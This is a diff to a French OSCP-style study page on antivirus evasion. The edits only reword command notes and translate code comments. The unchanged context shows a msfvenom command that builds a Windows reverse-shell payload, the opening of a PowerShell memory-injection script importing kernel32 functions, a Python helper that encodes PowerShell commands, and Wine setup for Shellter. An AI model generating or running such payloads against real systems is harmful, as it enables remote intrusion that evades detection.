@@ -27,7 +27,7 @@ msfvenom -p windows/shell_reverse_tcp LHOST=[IP] LPORT=[PORT] -f powershell -v s
 ### Scénario
 
 
-<p class="oscp-command-note">Script PowerShell dans la rubrique « Script ».</p>
+<p class="oscp-command-note">PowerShell : définir les imports de fonctions Win32 employés par l'exemple de mémoire.</p>
 
 ```powershell
 # Importer les fonctions nécessaires de kernel32.dll et msvcrt.dll
@@ -72,7 +72,7 @@ while ($true) {
 ```
 
 
-<p class="oscp-command-note">Script Python lié à « Script ».</p>
+<p class="oscp-command-note">Extrait de code source Python de l'outil présenté : ne pas le lancer ligne par ligne.</p>
 
 ```python
 #!/usr/bin/env python
@@ -93,12 +93,12 @@ import os
 import getopt
 
 def powershell_encode(data):
-    # blank command will store our fixed unicode variable
+    # La commande vide conserve la variable Unicode préparée.
     blank_command = ""
     powershell_command = ""
     # Supprimer les caractères parasites éventuellement ajoutés par PowerShell ISE
     n = re.compile(u'(\xef|\xbb|\xbf)')
-    # loop through each character and insert null byte
+    # Parcourir chaque caractère puis insérer l'octet nul.
     for char in (n.sub("", data)):
         # insert the nullbyte
         blank_command += char + "\x00"
@@ -173,7 +173,7 @@ sudo apt install wine
 ```
 
 
-<p class="oscp-command-note">Examiner ou gérer les paquets installés.</p>
+<p class="oscp-command-note">Syntaxe ou résultat illustratif pour «Shellter (outil automatisé)» (ne pas exécuter comme une commande).</p>
 
 ```text
 dpkg --add-architecture i386 && apt-get update && apt-get install wine32
